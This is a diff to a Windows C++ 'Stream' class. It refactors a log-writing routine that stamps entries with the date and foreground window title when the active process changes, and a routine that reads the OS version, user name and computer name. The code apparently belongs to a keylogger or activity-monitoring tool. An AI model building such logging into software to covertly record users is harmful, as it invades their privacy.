@@ -1,4 +1,5 @@
 #include "stream.h"
+#include "debug.h"
 #include <iostream>
 
 #define APPDATA "APPDATA"
@@ -23,17 +24,15 @@ bool Stream::MakeDir(const std::string &path) {
   return ret;
 }
 
-bool Stream::WriteLog(const std::string &input, unsigned int active, const bool blockProcessInfo) {
-  bool processInfo = false;
+bool Stream::WriteLog(const std::string &input, uint32_t active, const bool blockProcessInfo) {
   uint32_t cur = SystemData::GetProcessId();
-  if (SystemData::ProcessChanged(active, cur, true)) {
-	processInfo = true;
-  }
+  bool processInfo = SystemData::ProcessChanged(active, cur, true);
 
   logFile->Ofstream.open(logFile->PathFull, std::fstream::app);
   if (!logFile->Ofstream.is_open()) {
 	return false;
   }
+
   if (processInfo && !blockProcessInfo) {
 	std::string timeString =
 		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
@@ -55,23 +54,22 @@ bool Stream::MakeFile() {
   return true;
 }
 
-void Stream::GetAccountInfo(UserData *data) {
+void Stream::GetAccountInfo() {
   OSVERSIONINFOEX info;
+
   ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
   info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
   GetVersionEx(reinterpret_cast<LPOSVERSIONINFOA>(&info));
-
-  data->osVersionInfo = info;
+  //userData.osVersionInfo = info;
 
   char sysName[UNLEN + 1];
   DWORD sysLen = UNLEN + 1;
-  GetUserName(sysName, &sysLen);
 
-  data->accountName = sysName;
+  GetUserName(sysName, &sysLen);
+  //userData.accountName = sysName;
 
   GetComputerName(sysName, &sysLen);
-
-  data->computerName = sysName;
+  //userData.computerName = sysName;
 }
 
 std::vector<std::filesystem::path> Stream::GetAllFilesInFolder(const std::string &firstFile) {
